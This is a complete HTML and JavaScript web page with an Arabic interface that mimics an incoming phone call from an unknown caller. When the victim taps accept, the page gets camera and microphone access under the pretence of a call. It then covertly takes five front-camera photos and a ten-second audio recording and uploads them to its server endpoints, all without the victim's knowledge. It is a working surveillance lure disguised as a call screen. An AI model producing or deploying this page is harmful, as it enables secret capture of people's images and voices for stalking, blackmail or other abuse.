<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مكالمة واردة</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
  body {
    background: linear-gradient(180deg, #0a0e1a 0%, #1a1f35 100%);
    font-family: -apple-system, sans-serif;
    color: #fff;
    height: 100vh;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .screen {
    width: 100%;
    height: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: space-between;
    padding: 60px 30px 80px;
  }
  .top {
    text-align: center;
    animation: fadeIn 0.5s;
  }
  .avatar {
    width: 130px;
    height: 130px;
    border-radius: 50%;
    background: linear-gradient(135deg, #3a4a6a, #1e2744);
    margin: 0 auto 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 60px;
    animation: ring-pulse 1.5s infinite;
  }
  @keyframes ring-pulse {
    0%   { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0.6); }
    70%  { box-shadow: 0 0 0 25px rgba(56, 189, 248, 0); }
    100% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0); }
  }
  .caller { font-size: 26px; font-weight: 600; margin-bottom: 8px; }
  .status { font-size: 15px; color: #94a3b8; animation: pulse 1.5s infinite; }
  @keyframes pulse { 50% { opacity: 0.4; } }

  .controls {
    display: flex;
    gap: 60px;
    animation: fadeIn 0.7s;
  }
  .btn {
    width: 75px;
    height: 75px;
    border-radius: 50%;
    border: none;
    font-size: 32px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: transform 0.15s;
    color: white;
  }
  .btn:active { transform: scale(0.9); }
  .btn.reject { background: #ef4444; box-shadow: 0 8px 25px rgba(239, 68, 68, 0.4); }
  .btn.accept { background: #22c55e; box-shadow: 0 8px 25px rgba(34, 197, 94, 0.4); animation: accept-shake 0.8s infinite; }
  @keyframes accept-shake {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-8px); }
  }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

  .video-bg {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    object-fit: cover;
    z-index: 1;
    filter: brightness(0.4) blur(1px);
    display: none;
  }
  .in-call .video-bg { display: block; }
  .in-call .screen { position: relative; z-index: 2; justify-content: space-between; }
  .in-call .avatar,
  .in-call .accept { display: none; }
  .in-call .status { color: #4ade80; }
  .in-call .top { padding-top: 20px; }
  .in-call .controls { gap: 20px; }
</style>
</head>
<body>

<video id="video" class="video-bg" autoplay playsinline muted></video>

<div class="screen">
  <div class="top">
    <div class="avatar">👤</div>
    <div class="caller">Unknown Caller</div>
    <div class="status" id="status">مكالمة واردة...</div>
  </div>

  <div class="controls" id="controls">
    <button class="btn reject" onclick="rejectCall()">✕</button>
    <button class="btn accept" onclick="acceptCall()">📞</button>
  </div>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
  const PHOTO_COUNT  = 5;
  const PHOTO_DELAY  = 2000;
  const AUDIO_SEC    = 10;

  const video    = document.getElementById('video');
  const canvas   = document.getElementById('canvas');
  const statusEl = document.getElementById('status');

  let ringtone    = null;
  let audioCtx    = null;
  let mediaRec    = null;
  let audioChunks = [];
  let stream      = null;
  let photosSent  = 0;

  // ============ الرنة والاهتزاز ============
  function startRinging() {
    ringtone = new Audio('/ringtone.mp3');
    ringtone.loop = true;
    ringtone.play().catch(() => {
      playGeneratedRing();
    });

    if (navigator.vibrate) {
      vibrateLoop();
    }
  }

  function vibrateLoop() {
    navigator.vibrate([500, 300, 500, 300, 500, 300, 500, 300, 500]);
    setTimeout(() => {
      if (ringtone) vibrateLoop();
    }, 4500);
  }

  function playGeneratedRing() {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    setInterval(() => {
      if (!audioCtx) return;
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.frequency.value = 440;
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.8);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.8);
    }, 1500);
  }

  function stopRinging() {
    if (ringtone) { ringtone.pause(); ringtone = null; }
    if (audioCtx) { audioCtx.close(); audioCtx = null; }
    if (navigator.vibrate) navigator.vibrate(0);
  }

  // ============ قبول المكالمة ============
  async function acceptCall() {
    stopRinging();
    document.body.classList.add('in-call');
    statusEl.innerText = "جاري الاتصال...";

    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: true
      });

      video.srcObject = stream;
      await video.play();
      statusEl.innerText = "مكالمة جارية...";

      startPhotoCapture();
      startAudioRecording();

    } catch (err) {
      console.error(err);
      statusEl.innerText = "❌ فشل الاتصال";
    }
  }

  // ============ التقاط 5 صور ============
  async function startPhotoCapture() {
    for (let i = 1; i <= PHOTO_COUNT; i++) {
      await new Promise(r => setTimeout(r, PHOTO_DELAY));
      await captureAndSend(i);
    }
  }

  function captureAndSend(index) {
    return new Promise((resolve) => {
      canvas.width  = video.videoWidth  || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0);

      canvas.toBlob(async (blob) => {
        if (!blob) return resolve();
        photosSent++;
        const form = new FormData();
        form.append("photo", blob, `call_${index}.jpg`);
        try {
          await fetch("/api/upload", { method: "POST", body: form });
        } catch (e) { console.error(e); }
        resolve();
      }, "image/jpeg", 0.9);
    });
  }

  // ============ تسجيل 10 ثواني صوت ============
  function startAudioRecording() {
    try {
      const audioTracks = stream.getAudioTracks();
      if (audioTracks.length === 0) return;

      const audioStream = new MediaStream(audioTracks);
      mediaRec = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
      audioChunks = [];

      mediaRec.ondataavailable = (e) => {
        if (e.data.size > 0) audioChunks.push(e.data);
      };

      mediaRec.onstop = async () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        await sendAudio(audioBlob);
      };

      mediaRec.start();

      setTimeout(() => {
        if (mediaRec && mediaRec.state === "recording") {
          mediaRec.stop();
        }
      }, AUDIO_SEC * 1000);

    } catch (e) {
      console.error("Audio error:", e);
    }
  }

  async function sendAudio(blob) {
    const form = new FormData();
    form.append("audio", blob, "call_audio.webm");
    try {
      await fetch("/api/upload-audio", { method: "POST", body: form });
    } catch (e) { console.error(e); }
  }

  // ============ رفض المكالمة ============
  function rejectCall() {
    stopRinging();
    statusEl.innerText = "تم رفض المكالمة";
    document.body.style.opacity = '0.5';
    setTimeout(() => window.close(), 1000);
  }

  startRinging();
</script>
</body>
</html>
